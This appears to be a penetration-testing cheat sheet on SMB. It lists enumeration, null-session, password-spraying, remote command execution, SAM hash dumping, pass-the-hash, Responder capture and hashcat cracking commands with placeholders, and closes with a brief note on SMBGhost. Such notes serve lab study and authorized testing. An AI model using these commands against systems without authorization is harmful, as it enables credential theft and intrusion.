# SMB

## SMB Basics

* Provides shared access to files, printers, and other network resources.
* Ports:

  * TCP/139, UDP/137-138 (NetBIOS)
  * TCP/445 (SMB over TCP/IP)
* Samba is the Linux/Unix implementation of SMB.
* MSRPC functions commonly run over SMB.

## Enumeration

### Nmap

```bash
nmap -sV -sC -p 139,445 <target_IP>
```

## Misconfigurations

### Null Sessions

```bash
smbclient -N -L //<target_IP>
smbmap -H <target_IP>
rpcclient -U '%' <target_IP>
enum4linux-ng.py -A -C <target_IP>
```

## Protocol-Specific Attacks

### Brute-Forcing and Password Spraying

```bash
crackmapexec smb <target_IP> -u <user_list> -p <password> --local-auth
```

### Remote Code Execution

```bash
impacket-psexec <user>:<password>@<target_IP>
crackmapexec smb <target_IP> -u <user> -p <password> -x 'whoami' --exec-method smbexec
```

### Logged-On Users

```bash
crackmapexec smb <target_IP> -u <user> -p <password> --loggedon-users
```

### Extract SAM Hashes

```bash
crackmapexec smb <target_IP> -u <user> -p <password> --sam
```

### Pass-the-Hash

```bash
crackmapexec smb <target_IP> -u <user> -H <hash>
```

## Forced Authentication (Responder)

```bash
responder -I <interface>
```

### Cracking Captured Hashes

```bash
hashcat -m 5600 <hash_file> <wordlist>
```

## Recent SMB Vulnerabilities

* **CVE-2020-0796 (SMBGhost)**
  SMBv3.1.1 compression flaw leading to unauthenticated RCE on affected Windows 10 versions.
